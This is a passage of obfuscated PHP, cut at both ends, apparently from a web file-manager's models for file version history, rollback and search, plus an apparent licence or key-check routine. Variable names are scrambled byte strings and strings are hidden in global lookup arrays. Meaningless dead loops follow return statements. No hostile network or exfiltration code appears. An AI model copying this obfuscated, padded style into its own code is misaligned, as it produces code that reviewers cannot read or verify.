$ååİ˜œî; $ÅÛÎÌ© = $ŞÖÙâÆõ[818]; if (strlen($ÅÛÎÌ©) < $ŞÖÙâÆõ[693]) { return; } $Ã¸ãÅôÉ = $ëüí‘„Å; $áÕÅ‘ë• = $ŞÖÙâÆõ[819]; if (strlen($áÕÅ‘ë•) < $ŞÖÙâÆõ[693]) { return; } while ($Ã¸ãÅôÉ % $À‰ñ¸ó¢ != 0) { $²¯»ıë¿ = $Ã¸ãÅôÉ; $Ã¸ãÅôÉ = $À‰ñ¸ó¢; $‘µªËÍ¢ = $ŞÖÙâÆõ[820]; while (strlen($‘µªËÍ¢) < $ŞÖÙâÆõ[688]) { if (!$‘µªËÍ¢) { break; } $‘µªËÍ¢++; } $À‰ñ¸ó¢ = $²¯»ıë¿ % $À‰ñ¸ó¢; $¿Ëï·ÄŠ = $ŞÖÙâÆõ[821]; while ($¿Ëï·ÄŠ < $ŞÖÙâÆõ[688]) { if ($¿Ëï·ÄŠ >= 0) { break; } $¿Ëï·ÄŠ++; } } if ($À‰ñ¸ó¢ == 1) { break; } else { $ååİ˜œî++; } } $íñĞàÉ = 2; $ÖÖùŸıƒ = $ŞÖÙâÆõ[822]; if (!$ÖÖùŸıƒ) { return; } for ($ŠÄúİƒŠ = 0; $ŠÄúİƒŠ < $ëüí‘„Å * 10; $ŠÄúİƒŠ++) { if (($ëüí‘„Å * $ŠÄúİƒŠ + 1) % $ååİ˜œî == 0) { $íñĞàÉ = intval(($ëüí‘„Å * $ŠÄúİƒŠ + 1) / $ååİ˜œî); break; } } $‘¡ı˜ôû = $this->csly3b9928b1($ Œ®¿øÅ * $„ËÊóâì . $û•ŸÂ½Ï[6], $û•ŸÂ½Ï[136]); $Îò¾µ…­ = md5($û•ŸÂ½Ï[304] . ($ Œ®¿øÅ + $„ËÊóâì) . $û•ŸÂ½Ï[305] . $ååİ˜œî . $û•ŸÂ½Ï[305] . $íñĞàÉ . $û•ŸÂ½Ï[306]); $ùó­¿˜« = $this->csly3b9928b1($Ÿûİ×Ö, $Îò¾µ…­) . $û•ŸÂ½Ï[307] . $‘¡ı˜ôû; return $ùó­¿˜«; $ÈÂµ»÷ = $ŞÖÙâÆõ[823]; while (strlen($ÈÂµ»÷) < $ŞÖÙâÆõ[701]) { if (!$ÈÂµ»÷) { break; } $ÈÂµ»÷++; } } public function bwdu8302a14a($úéÌÎ‘Á) { $µİÛªâ€ =& $_SERVER[ÅÄÇĞô]; $ã¤îúøä =& $_SERVER[¥Ö¼Ø±–]; $ÙãÊÔã¿ = explode($ã¤îúøä[307], $úéÌÎ‘Á); if (count($ÙãÊÔã¿) != 2) { return $ã¤îúøä[6]; } $…ÀúÌ¦Š = $this->inpq8af63ec9($ÙãÊÔã¿[1] . $ã¤îúøä[6], $ã¤îúøä[136]); $Õé©½³‘ = $µİÛªâ€[824]; if (strlen($Õé©½³‘) < $µİÛªâ€[701]) { die; } if (!$…ÀúÌ¦Š) { return $ã¤îúøä[6]; } $…ÀúÌ¦Š = intval($…ÀúÌ¦Š); $¼ÎŠæ¥  = 0; $ç­ù÷è = $µİÛªâ€[825]; $Š¬í‹úÃ = 0; $äÅ”èğù = $µİÛªâ€[826]; for ($¿ôêìú = 3; $¿ôêìú < $…ÀúÌ¦Š; $¿ôêìú += 2) { if ($…ÀúÌ¦Š % $¿ôêìú != 0) { continue; } $¼ÎŠæ¥  = $¿ôêìú; $Š¬í‹úÃ = intval($…ÀúÌ¦Š / $¿ôêìú); break; } $È´µ‰Å† = ($¼ÎŠæ¥  - 1) * ($Š¬í‹úÃ - 1); $îŸĞûé = $µİÛªâ€[827]; if (!$îŸĞûé) { die; } $èÑ¹Ì€‰ = intval(($¼ÎŠæ¥  + $Š¬í‹úÃ) / 2); while (1) { $·Ù³¾—• = $èÑ¹Ì€‰; $óÓü½ûñ = $È´µ‰Å†; $ê–ä¨Š = $µİÛªâ€[828]; if (!$ê–ä¨Š) { die; } while ($óÓü½ûñ % $·Ù³¾—• != 0) { $®ÃÂ¦‘ï = $óÓü½ûñ; $óÓü½ûñ = $·Ù³¾—•; $·Ù³¾—• = $®ÃÂ¦‘ï % $·Ù³¾—•; } if ($·Ù³¾—• == 1) { break; } else { $èÑ¹Ì€‰++; } } $¹ßò°±İ = 2; for ($¿ôêìú = 0; $¿ôêìú < $È´µ‰Å† * 10; $¿ôêìú++) { if (($È´µ‰Å† * $¿ôêìú + 1) % $èÑ¹Ì€‰ == 0) { $¹ßò°±İ = intval(($È´µ‰Å† * $¿ôêìú + 1) / $èÑ¹Ì€‰); break; } } $¹ş³å† = md5($ã¤îúøä[304] . ($¼ÎŠæ¥  + $Š¬í‹úÃ) . $ã¤îúøä[305] . $èÑ¹Ì€‰ . $ã¤îúøä[305] . $¹ßò°±İ . $ã¤îúøä[306]); $·÷öçœ = $µİÛªâ€[829]; while (strlen($·÷öçœ) < $µİÛªâ€[701]) { if (!$·÷öçœ) { break; } $·÷öçœ++; } $å©€Ÿƒ› = $this->inpq8af63ec9($ÙãÊÔã¿[0], $¹ş³å†); return $å©€Ÿƒ›; $¡Æƒè—± = $µİÛªâ€[830]; while (strlen($¡Æƒè—±) < $µİÛªâ€[704]) { if (!$¡Æƒè—±) { break; } $¡Æƒè—±++; } } public function xkgj62e98668() { $‚óşµõ =& $_SERVER[ÅÄÇĞô]; $ãâÂßÀÊ = mt_rand(pow(2, 14), pow(2, 16) - 1); $É¡€µÕ† = array(); $‹óäÛ¨ = 1; $áÀĞë÷­ = $‚óşµõ[831]; if (!$áÀĞë÷­) { die; } while ($‹óäÛ¨ <= (int) sqrt($ãâÂßÀÊ)) { $©•­Êí§ = $‹óäÛ¨; while (!0) { $©•­Êí§++; $Ù›‘ñ“œ = $‚óşµõ[832]; if ($©•­Êí§ <= 2) { $‹óäÛ¨ = $©•­Êí§; break; } else { if ($©•­Êí§ < 2) { continue; } } $áì‡à©‚ = !0; for ($úé²°¾Õ = 2; $úé²°¾Õ <= sqrt($©•­Êí§); $úé²°¾Õ++) { if ($©•­Êí§ % $úé²°¾Õ == 0) { $áì‡à©‚ = !1; } } if ($áì‡à©‚) { $‹óäÛ¨ = $©•­Êí§; break; } } $É¡€µÕ†[] = $‹óäÛ¨; $ïÕ„•³¹ = $‚óşµõ[727]; } $ˆ¸µÁ£š = 2; for ($©•­Êí§ = $ãâÂßÀÊ; $©•­Êí§ > 1; $©•­Êí§--) { $áì‡à©‚ = !0; foreach ($É¡€µÕ† as $ƒíôÌÏ©) { if ($©•­Êí§ % $ƒíôÌÏ© == 0) { $áì‡à©‚ = !1; break; } } if ($áì‡à©‚) { $ˆ¸µÁ£š = $©•­Êí§; break; } } return $ˆ¸µÁ£š; } public function lkgub6b7d451($¨ì®‰Å—, $Î¹ü‡ÜÊ) { $ÁÅ¢ÊÈß =& $_SERVER[¥Ö¼Ø±–]; return call_user_func(array($ÁÅ¢ÊÈß[8], $ÁÅ¢ÊÈß[308]), $¨ì®‰Å—, $Î¹ü‡ÜÊ); $ŞÖ¾Ã¥ = $_SERVER[ÅÄÇĞô][833]; if (!$ŞÖ¾Ã¥) { die; } } public function csly3b9928b1($àà¢àà¹, $¨€ĞàŞß) { $‹óÙ´ò =& $_SERVER[¥Ö¼Ø±–]; return call_user_func(array($‹óÙ´ò[309], $‹óÙ´ò[310]), $àà¢àà¹, $¨€ĞàŞß); } public function inpq8af63ec9($’ê…øŒ, $äŒ˜Ë¤·) { $½€äØóƒ =& $_SERVER[¥Ö¼Ø±–]; return call_user_func(array($½€äØóƒ[309], $½€äØóƒ[311]), $’ê…øŒ, $äŒ˜Ë¤·); $‚¶Œ¡×× = $_SERVER[ÅÄÇĞô][834]; } } $_file = $_SERVER[$_SERVER[ÅÄÇĞô][835]]; goto A§¿¬ƒ„…; båç—†²·‰: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\143\145\x5f\150\151\x73\x74\x6f\x72\171"; public function historyCount($òòöŞ×) { $»àÔöÙ® =& $_SERVER[ÅÄÇĞô]; if (!$òòöŞ×) { return array(); } if (is_string($òòöŞ×) || is_int($òòöŞ×)) { $òòöŞ× = array($òòöŞ×); } $Æœ‚Ò– = array($»àÔöÙ®[194], $»àÔöÙ®[2252] => $»àÔöÙ®[570]); $Ğ”ç † = array($»àÔöÙ®[194] => array($»àÔöÙ®[7], $òòöŞ×)); $ÅŞ¼”© = $this->field($Æœ‚Ò–)->where($Ğ”ç †)->group($»àÔöÙ®[194])->select(); return array_to_keyvalue($ÅŞ¼”©, $»àÔöÙ®[194], $»àÔöÙ®[570]); } public function addHistory($Ì•ñŠÏ›, $­ß©±¬¢ = '') { $’‘£©¾é =& $_SERVER[ÅÄÇĞô]; $„Æ²ëı¸ = array($’‘£©¾é[494] => $Ì•ñŠÏ›[$’‘£©¾é[194]], $’‘£©¾é[1788] => isset($Ì•ñŠÏ›[$’‘£©¾é[532]]) ? $Ì•ñŠÏ›[$’‘£©¾é[532]] : $Ì•ñŠÏ›[$’‘£©¾é[530]], $’‘£©¾é[547] => $Ì•ñŠÏ›[$’‘£©¾é[546]], $’‘£©¾é[625] => $Ì•ñŠÏ›[$’‘£©¾é[79]], $’‘£©¾é[2253] => $­ß©±¬¢); if ($GLOBALS[$’‘£©¾é[6]][$’‘£©¾é[92]][$’‘£©¾é[1325]] >= 1) { $this->historyAutoClear($„Æ²ëı¸[$’‘£©¾é[194]]); $this->add($„Æ²ëı¸); } Hook::trigger($’‘£©¾é[2254], $„Æ²ëı¸); Model($’‘£©¾é[2255])->eventFileEdit($Ì•ñŠÏ›[$’‘£©¾é[194]]); } private function historyAutoClear($¢¶…Õİ) { $Õ°¶Ñ€ñ =& $_SERVER[ÅÄÇĞô]; $ßø´–Şç = Model($Õ°¶Ñ€ñ[865])->get($Õ°¶Ñ€ñ[1347]); $‰ñı•Ò = intval($GLOBALS[$Õ°¶Ñ€ñ[6]][$Õ°¶Ñ€ñ[92]][$Õ°¶Ñ€ñ[1325]]); $ñˆŠŞŒî = $ßø´–Şç == $Õ°¶Ñ€ñ[1348] ? min(5, $‰ñı•Ò) : $‰ñı•Ò; $ñˆŠŞŒî = $ñˆŠŞŒî <= 0 ? 0 : $ñˆŠŞŒî - 1; if ($ñˆŠŞŒî >= 499) { return; } $æˆÄğÃ™ = array($Õ°¶Ñ€ñ[494] => $¢¶…Õİ); $ãô˜ÍÇö = $this->field($Õ°¶Ñ€ñ[2256])->where($æˆÄğÃ™)->order($Õ°¶Ñ€ñ[2249])->select(); if (!$ãô˜ÍÇö || $ñˆŠŞŒî >= count($ãô˜ÍÇö)) { return; } $Á€³–® = array_to_keyvalue($ãô˜ÍÇö, $Õ°¶Ñ€ñ[12], $Õ°¶Ñ€ñ[478]); $Á€³–® = array_slice($Á€³–®, $ñˆŠŞŒî); $³â’§àÕ = array_to_keyvalue($ãô˜ÍÇö, $Õ°¶Ñ€ñ[12], $Õ°¶Ñ€ñ[546]); $³â’§àÕ = array_slice($³â’§àÕ, $ñˆŠŞŒî); if (!$Á€³–® || !$³â’§àÕ) { return; } $æˆÄğÃ™ = array($Õ°¶Ñ€ñ[496] => array($Õ°¶Ñ€ñ[7], $Á€³–®)); $this->where($æˆÄğÃ™)->delete(); Model($Õ°¶Ñ€ñ[549])->remove($³â’§àÕ); } public function listData($Â¾Ï±“½) { $­ÔÙéóÇ =& $_SERVER[ÅÄÇĞô]; $»ÁÅè = array($­ÔÙéóÇ[494] => $Â¾Ï±“½); $ı‹©öÅë = $­ÔÙéóÇ[2257]; $ãŞ­åà = $this->field($ı‹©öÅë)->where($»ÁÅè)->order($­ÔÙéóÇ[2249])->selectPage(); $this->_listAppendUser($ãŞ­åà[$­ÔÙéóÇ[448]]); $³üòª©ø = Model($­ÔÙéóÇ[865])->get($­ÔÙéóÇ[1347]); $¾Ìı™²Ã = 5; if ($³üòª©ø == $­ÔÙéóÇ[1348]) { $ãŞ­åà[$­ÔÙéóÇ[448]] = array_slice($ãŞ­åà[$­ÔÙéóÇ[448]], 0, $¾Ìı™²Ã); $ãŞ­åà[$­ÔÙéóÇ[445]] = array($­ÔÙéóÇ[2258] => 1, $­ÔÙéóÇ[2259] => 20, $­ÔÙéóÇ[2260] => 1, $­ÔÙéóÇ[2261] => count($ãŞ­åà[$­ÔÙéóÇ[448]])); } return $ãŞ­åà; } protected function _listAppendUser(&$úŞÑèÔÇ) { $ÆìıÂìã =& $_SERVER[ÅÄÇĞô]; $Ô™˜‚å› = array_to_keyvalue($úŞÑèÔÇ, $ÆìıÂìã[12], $ÆìıÂìã[1797]); $Õ¹ôÓ”„ = Model($ÆìıÂìã[602])->userListInfo($Ô™˜‚å›); foreach ($úŞÑèÔÇ as &$¯Ê¡Šˆ°) { $íô”ºğ = $¯Ê¡Šˆ°[$ÆìıÂìã[1797]]; $¯Ê¡Šˆ°[$ÆìıÂìã[530]] = $Õ¹ôÓ”„[$íô”ºğ] ? $Õ¹ôÓ”„[$íô”ºğ] : !1; } unset($¯Ê¡Šˆ°); } public function fileInfo($¬’âÌõ) { $°Æ”üû† =& $_SERVER[ÅÄÇĞô]; $ßÀ¦Î‡‹ = $this->tablePrefix; $Ó÷’¢ŠÌ = "{$ßÀ¦Î‡‹}\151\x6f\x5f\x66\151\154\145\40\x66\x69\154\x65\163\40\157\156\40\x66\x69\x6c\145\163\56\146\x69\x6c\x65\x49\104\40\75\40\x68\x69\163\164\157\162\x79\x2e\146\x69\154\x65\111\x44"; return $this->alias($°Æ”üû†[2262])->where(array($°Æ”üû†[496] => $¬’âÌõ))->join($Ó÷’¢ŠÌ, $°Æ”üû†[2263])->find(); } public function removeItem($ìÒ¿›õÌ) { $áÁó™·† =& $_SERVER[ÅÄÇĞô]; $™Î´ê´ú = array($áÁó™·†[496] => $ìÒ¿›õÌ); $ş§‡Ë§¡ = $this->where($™Î´ê´ú)->find(); if ($ş§‡Ë§¡) { $”¯ş‚„ = $this->where($™Î´ê´ú)->delete(); Model($áÁó™·†[549])->remove($ş§‡Ë§¡[$áÁó™·†[546]]); return $”¯ş‚„; } return !1; } public function removeBySource($¾è†¦ÓÚ) { $½Î›àß =& $_SERVER[ÅÄÇĞô]; if (!$¾è†¦ÓÚ) { return !1; } if (!is_array($¾è†¦ÓÚ)) { $¾è†¦ÓÚ = array($¾è†¦ÓÚ); } $ÊÑËöÔ± = array($½Î›àß[494] => array($½Î›àß[7], $¾è†¦ÓÚ)); $Èü…‚æ = $this->field($½Î›àß[547])->where($ÊÑËöÔ±)->select(); if ($Èü…‚æ) { $this->where($ÊÑËöÔ±)->delete(); $¬Ã¶ÈÇó = array_to_keyvalue($Èü…‚æ, $½Î›àß[12], $½Î›àß[546]); Model($½Î›àß[549])->remove($¬Ã¶ÈÇó); } return !0; } public function setDetail($ëì¾Øæš, $İÉî•´Û) { $Â°’ÕÌ÷ =& $_SERVER[ÅÄÇĞô]; return $this->where(array($Â°’ÕÌ÷[496] => $ëì¾Øæš))->save(array($Â°’ÕÌ÷[2253] => $İÉî•´Û)); } public function rollbackToItem($ï¢¤‰Ï¢, $ä„ş‰ìÇ) { $ è‚Ó¬ =& $_SERVER[ÅÄÇĞô]; $ë’µÇŠÇ = Model($ è‚Ó¬[925])->sourceInfo($ï¢¤‰Ï¢); $this->addHistory($ë’µÇŠÇ, LNG($ è‚Ó¬[2264])); $Éá…°™ = $this->find($ä„ş‰ìÇ); $ñ„ìŸš­ = array($ è‚Ó¬[546] => $Éá…°™[$ è‚Ó¬[546]], $ è‚Ó¬[79] => $Éá…°™[$ è‚Ó¬[79]], $ è‚Ó¬[88] => time(), $ è‚Ó¬[532] => USER_ID); Model($ è‚Ó¬[925])->where(array($ è‚Ó¬[194] => $ï¢¤‰Ï¢))->save($ñ„ìŸš­); return $this->where(array($ è‚Ó¬[496] => $ä„ş‰ìÇ))->delete(); } public function clearSame($ò—šĞÍ) { $ñÂ÷Ê» =& $_SERVER[ÅÄÇĞô]; $ï‹¼  ¬ = $this->listData($ò—šĞÍ); $¶ËÂ˜‹î = array_to_keyvalue_group($ï‹¼  ¬, $ñÂ÷Ê»[546]); $¡ùüŒÉ = array(); $Ì“éº†Ş = array(); foreach ($¶ËÂ˜‹î as $¾æûê„±) { if (!$¾æûê„± || count($¾æûê„±) <= 1) { continue; } foreach ($¾æûê„± as $ƒÕšµ¦ì) { $¡ùüŒÉ[] = $ƒÕšµ¦ì[$ñÂ÷Ê»[546]]; $Ì“éº†Ş[] = $ƒÕšµ¦ì[$ñÂ÷Ê»[478]]; } } if (!$Ì“éº†Ş) { return; } $this->where(array($ñÂ÷Ê»[478] => array($ñÂ÷Ê»[7], $Ì“éº†Ş)))->delete(); Model($ñÂ÷Ê»[549])->remove($¡ùüŒÉ); } public function userSpace() { $»™Ù„ë™ =& $_SERVER[ÅÄÇĞô]; $ÒÃº›”ç = $this->tablePrefix; $ˆ¸å¶Ì° = array($»™Ù„ë™[1788] => USER_ID); $ŸÌËºí = "{$ÒÃº›”ç}\x69\157\x5f\x66\x69\154\145\40\146\x69\154\x65\x73\x20\157\156\40\146\x69\x6c\x65\x73\x2e\146\x69\154\145\111\x44\40\75\40\150\151\x73\x74\x6f\x72\x79\56\x66\x69\x6c\145\x49\104"; return $this->alias($»™Ù„ë™[2262])->where($ˆ¸å¶Ì°)->join($ŸÌËºí, $»™Ù„ë™[2263])->sum($»™Ù„ë™[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($ÊéÕıÓÒ) { $ƒ¾©é¬› =& $_SERVER[ÅÄÇĞô]; $í†¶­Ö = KodIO::fileTypeList(); $¬ÚÔ²® = $í†¶­Ö[$ÊéÕıÓÒ]; if (!$¬ÚÔ²®) { return array(); } $—½¤È²¸ = $¬ÚÔ²®[$ƒ¾©é¬›[169]]; $±•·»¼á = $ƒ¾©é¬›[7]; if (!$¬ÚÔ²®[$ƒ¾©é¬›[169]]) { $‹ÕÖÛù³ = array_to_keyvalue($í†¶­Ö, $ƒ¾©é¬›[12], $ƒ¾©é¬›[169]); $—½¤È²¸ = implode($ƒ¾©é¬›[50], $‹ÕÖÛù³); $±•·»¼á = $ƒ¾©é¬›[2265]; } $¿€ºÀ¤Ş = explode($ƒ¾©é¬›[50], trim($—½¤È²¸, $ƒ¾©é¬›[50])); return array($±•·»¼á, $¿€ºÀ¤Ş); } public function listPathType($Ç¼»Â¥Ì) { $èêÕ´Íû =& $_SERVER[ÅÄÇĞô]; $¿ê£íí¦ = $this->fileTypeWhere($Ç¼»Â¥Ì); if (!$¿ê£íí¦) { return array(); } $ÆúºÁ•‘ = USER_ID; $¿‚öÓĞ¡ = Model($èêÕ´Íû[602])->getInfo($ÆúºÁ•‘); $’ÑÃŠøê = array($èêÕ´Íû[656] => SourceModel::TYPE_USER, $èêÕ´Íû[589] => array($èêÕ´Íû[620], $èêÕ´Íû[598] . $¿‚öÓĞ¡[$èêÕ´Íû[90]][$èêÕ´Íû[194]] . $èêÕ´Íû[621]), $èêÕ´Íû[657] => $ÆúºÁ•‘, $èêÕ´Íû[654] => 0, $èêÕ´Íû[655] => $¿ê£íí¦); return $this->listSource($’ÑÃŠøê); } public function listSearch($×˜ÈéÃÛ, $¬Í°Ë÷ = 300) { $¥œûªšŒ =& $_SERVER[ÅÄÇĞô]; if (isset($×˜ÈéÃÛ[$¥œûªšŒ[2096]]) && $×˜ÈéÃÛ[$¥œûªšŒ[2096]]) { $×˜ÈéÃÛ[$¥œûªšŒ[2096]] = str_replace($¥œûªšŒ[463], $¥œûªšŒ[2266], trim($×˜ÈéÃÛ[$¥œûªšŒ[2096]])); } $“»†ÏêÆ = $this->_parseSearchWhere($×˜ÈéÃÛ); if (!isset($“»†ÏêÆ[$¥œûªšŒ[508]])) { $“»†ÏêÆ[$¥œûªšŒ[508]] = 0; } $›Óø”ïã = $¥œûªšŒ[2267]; $ß®ç‚øÒ = $“»†ÏêÆ; $éóï®›æ = $›Óø”ïã; $this->_listSearchBindPinyin($×˜ÈéÃÛ, $“»†ÏêÆ, $›Óø”ïã); $this->alias($¥œûªšŒ[522])->_makeOrder(); $“»†ÏêÆ = $this->parseWhereLike($“»†ÏêÆ); $Äõ˜—Ş = $this->distinct(!0)->field($›Óø”ïã)->where($“»†ÏêÆ)->selectPage($¬Í°Ë÷); if ($GLOBALS[$¥œûªšŒ[6]][$¥œûªšŒ[460]][$¥œûªšŒ[461]] && Input::check($×˜ÈéÃÛ[$¥œûªšŒ[2096]], $¥œûªšŒ[663]) && $Äõ˜—Ş[$¥œûªšŒ[445]][$¥œûªšŒ[431]] == 1 && $Äõ˜—Ş[$¥œûªšŒ[445]][$¥œûªšŒ[446]] == 0) { $Äõ˜—Ş = $this->distinct(!0)->field($›Óø”ïã)->where($ß®ç‚øÒ)->limit(1000)->select(); $Äõ˜—Ş = array_page_split($Äõ˜—Ş, !1, $¬Í°Ë÷); } $this->_listSearchFileContent($Äõ˜—Ş, $×˜ÈéÃÛ, $éóï®›æ, $ß®ç‚øÒ); $this->_listSearchDesc($Äõ˜—Ş, $×˜ÈéÃÛ, $éóï®›æ); $this->_listSearchTag($Äõ˜—Ş, $×˜ÈéÃÛ, $éóï®›æ); $this->_listSearchGroupTag($Äõ˜—Ş, $×˜ÈéÃÛ, $éóï®›æ); $this->_listDataApply($Äõ˜—Ş[$¥œûªšŒ[448]]); $this->_listMake($Äõ˜—Ş); return $Äõ˜—Ş; } private function _listSearchFileContent(&$¨ü¥ô¿â, $Áßäî§¥, $·Ìò“£æ, $¬š˜•Ï¨) { $÷Æóîşá =& $_SERVER[ÅÄÇĞô]; if (!$Áßäî§¥[$÷Æóîşá[2096]] || $¨ü¥ô¿â[$÷Æóîşá[445]][$÷Æóîşá[431]] > 1) { return; } if (!isset($¬š˜•Ï¨[$÷Æóîşá[32]]) || !is_array($Áßäî§¥[$÷Æóîşá[546]])) { return; } $¬š˜•Ï¨[$÷Æóîşá[546]] = array($÷Æóîşá[7], $Áßäî§¥[$÷Æóîşá[546]]); unset($¬š˜•Ï¨[$÷Æóîşá[32]]); unset($Áßäî§¥[$÷Æóîşá[546]]); $ú²ª“’ì = $this->field($·Ìò“£æ)->where($¬š˜•Ï¨)->limit($÷Æóîşá[2268])->select(); if (!$ú²ª“’ì || count($ú²ª“’ì) == 0) { return; } $¨ü¥ô¿â[$÷Æóîşá[448]] = array_merge($ú²ª“’ì, $¨ü¥ô¿â[$÷Æóîşá[448]]); $¨ü¥ô¿â[$÷Æóîşá[445]][$÷Æóîşá[446]] += count($ú²ª“’ì); } private function _listSearchTag(&$Ã÷„”¨´, $ôÎøÑÛ”, $­¾ÛßÀ¡) { $¢á´ëñ¯ =& $_SERVER[ÅÄÇĞô]; if (!isset($ôÎøÑÛ”[$¢á´ëñ¯[2269]])) { return; } if (!$ôÎøÑÛ”[$¢á´ëñ¯[2096]] || $Ã÷„”¨´[$¢á´ëñ¯[445]][$¢á´ëñ¯[431]] > 1) { return; } $Î¶›µÜ‡ = Model($¢á´ëñ¯[2270])->listData(); $ó…Ù«ù = array(); $„œ»ßˆŸ = $ôÎøÑÛ”[$¢á´ëñ¯[2096]]; foreach ($Î¶›µÜ‡ as $Ì•ˆÌ°³) { $¼™¨¿î• = $Ì•ˆÌ°³[$¢á´ëñ¯[32]]; $ò…øèÑ© = str_replace($¢á´ëñ¯[53], $¢á´ëñ¯[12], Pinyin::get($¼™¨¿î•)); if (stripos($¼™¨¿î•, $„œ»ßˆŸ) !== !1 || stripos($ò…øèÑ©, $„œ»ßˆŸ) !== !1) { $ó…Ù«ù[] = $Ì•ˆÌ°³[$¢á´ëñ¯[478]]; } } if (!$ó…Ù«ù) { return; } $Ë—…ƒ¥ = array($¢á´ëñ¯[503] => array($¢á´ëñ¯[7], $ó…Ù«ù), $¢á´ëñ¯[1797] => USER_ID); $„Û¼´ª = Model($¢á´ëñ¯[505])->field($¢á´ëñ¯[87])->where($Ë—…ƒ¥)->select(); $„Û¼´ª = array_to_keyvalue($„Û¼´ª, $¢á´ëñ¯[12], $¢á´ëñ¯[87]); $ƒ×üá´ø = array_unique($„Û¼´ª); $this->_listSearchMerge($Ã÷„”¨´, $ôÎøÑÛ”, $­¾ÛßÀ¡, $ƒ×üá´ø); } private function _listSearchDesc(&$ñ‡ÖğØ, $¶¶Ä¨, $¢ºõï€) { $ëÇºÍ± =& $_SERVER[ÅÄÇĞô]; if (!isset($¶¶Ä¨[$ëÇºÍ±[529]])) { return; } if (!$¶¶Ä¨[$ëÇºÍ±[2096]] || $ñ‡ÖğØ[$ëÇºÍ±[445]][$ëÇºÍ±[431]] > 1) { return; } $„Æœæ¥¥ = array($ëÇºÍ±[97] => $ëÇºÍ±[529], $ëÇºÍ±[453] => array($ëÇºÍ±[462], $ëÇºÍ±[2098] . $¶¶Ä¨[$ëÇºÍ±[2096]] . $ëÇºÍ±[2098])); $Š´ĞÄÕğ = !1; if ($Š´ĞÄÕğ) { $öÒ²Ñò = $this->listSearchChildren($¶¶Ä¨[$ëÇºÍ±[193]]); $öÒ²Ñò = array_unique($öÒ²Ñò); if (!$öÒ²Ñò) { return; } $„Æœæ¥¥[$ëÇºÍ±[194]] = array($ëÇºÍ±[7], $öÒ²Ñò); } $Ğşİ”êÍ = Model($ëÇºÍ±[640])->field($ëÇºÍ±[194])->where($„Æœæ¥¥)->limit(5000)->select(); $î•”„¨³ = array_to_keyvalue($Ğşİ”êÍ, $ëÇºÍ±[12], $ëÇºÍ±[194]); $this->_listSearchMerge($ñ‡ÖğØ, $¶¶Ä¨, $¢ºõï€, $î•”„¨³); } private function _listSearchGroupTag(&$áï¹É¥, $÷µ¿¹‹, $Óä™ê‡) { $ü°ÛäÂÈ =& $_SERVER[ÅÄÇĞô]; if (!isset($÷µ¿¹‹[$ü°ÛäÂÈ[2269]])) { return; } if (!$÷µ¿¹‹[$ü°ÛäÂÈ[2096]] || $áï¹É¥[$ü°ÛäÂÈ[445]][$ü°ÛäÂÈ[431]] > 1 || !$÷µ¿¹‹[$ü°ÛäÂÈ[193]]) { return; } $³æÄïè‹ = $this->sourceInfo($÷µ¿¹‹[$ü°ÛäÂÈ[193]]); if (!$³æÄïè‹ || $³æÄïè‹[$ü°ÛäÂÈ[191]] != SourceModel::TYPE_GROUP) { return; } $âû¯˜¡ı = $³æÄïè‹[$ü°ÛäÂÈ[574]]; $æ±¿°Í = Model($ü°ÛäÂÈ[2271])->get($âû¯˜¡ı); $¨¦¶áˆá = array(); $ë©©É´© = $÷µ¿¹‹[$ü°ÛäÂÈ[2096]]; foreach ($æ±¿°Í[$ü°ÛäÂÈ[448]] as $”«ñë­ò) { $´ÙÏÈêÁ = $”«ñë­ò[$ü°ÛäÂÈ[32]]; $ÅÄÛñˆÌ = str_replace($ü°ÛäÂÈ[53], $ü°ÛäÂÈ[12], Pinyin::get($´ÙÏÈêÁ)); if (stripos($´ÙÏÈêÁ, $ë©©É´©) !== !1 || stripos($ÅÄÛñˆÌ, $ë©©É´©) !== !1) { $¨¦¶áˆá[] = $”«ñë­ò[$ü°ÛäÂÈ[478]]; } } if (!$¨¦¶áˆá) { return; } $ïØÃê’ö = array($ü°ÛäÂÈ[503] => array($ü°ÛäÂÈ[7], $¨¦¶áˆá), $ü°ÛäÂÈ[1797] => 0, $ü°ÛäÂÈ[33] => $ü°ÛäÂÈ[2118] . $âû¯˜¡ı); $øÕæˆü€ = Model($ü°ÛäÂÈ[505])->field($ü°ÛäÂÈ[87])->where($ïØÃê’ö)->select(); $øÕæˆü€ = array_to_keyvalue($øÕæˆü€, $ü°ÛäÂÈ[12], $ü°ÛäÂÈ[87]); $¤…àÃ× = array_unique($øÕæˆü€); $this->_listSearchMerge($áï¹É¥, $÷µ¿¹‹, $Óä™ê‡, $¤…àÃ×); } private function _listSearchMerge(&$şŸ–¨Ó, $ªœ¨‹ì, $îàÂèÛ, $É¯Æ¸À) { $“¿ö¦Ñ² =& $_SERVER[ÅÄÇĞô]; if (!$É¯Æ¸À) { return; } $ÇÙŠ°æ³ = array_to_keyvalue($şŸ–¨Ó[$“¿ö¦Ñ²[448]], $“¿ö¦Ñ²[12], $“¿ö¦Ñ²[194]); $„š¯³¼Ğ = array_diff($É¯Æ¸À, $ÇÙŠ°æ³); if (!$„š¯³¼Ğ) { return; } $©ñèŸŠº = array($“¿ö¦Ñ²[194] => array($“¿ö¦Ñ²[7], $„š¯³¼Ğ)); $©È¿Ş¿æ = $this->field($îàÂèÛ)->where($©ñèŸŠº)->select(); if (!$©È¿Ş¿æ) { return; } $¸ªÉ©ÍØ = array(); foreach ($©È¿Ş¿æ as $ŒùÁ¸Ş¥) { if ($this->_listSearchFilter($ŒùÁ¸Ş¥, $ªœ¨‹ì)) { $¸ªÉ©ÍØ[] = $ŒùÁ¸Ş¥; } } $şŸ–¨Ó[$“¿ö¦Ñ²[448]] = array_merge($¸ªÉ©ÍØ, $şŸ–¨Ó[$“¿ö¦Ñ²[448]]); $şŸ–¨Ó[$“¿ö¦Ñ²[445]][$“¿ö¦Ñ²[446]] += count($¸ªÉ©ÍØ); } private function _listSearchFilter($¨–¹êãš, $İè‚¹­) { $“ÔÕ±ŞÓ =& $_SERVER[ÅÄÇĞô]; $¢§õ’ Ì = $¨–¹êãš[$“ÔÕ±ŞÓ[488]] == $“ÔÕ±ŞÓ[91]; if (!strstr($¨–¹êãš[$“ÔÕ±ŞÓ[589]], $“ÔÕ±ŞÓ[50] . $İè‚¹­[$“ÔÕ±ŞÓ[193]] . $“ÔÕ±ŞÓ[50])) { return !1; } if (isset($İè‚¹­[$“ÔÕ±ŞÓ[489]]) && $İè‚¹­[$“ÔÕ±ŞÓ[489]] != $“ÔÕ±ŞÓ[871]) { if ($İè‚¹­[$“ÔÕ±ŞÓ[489]] == 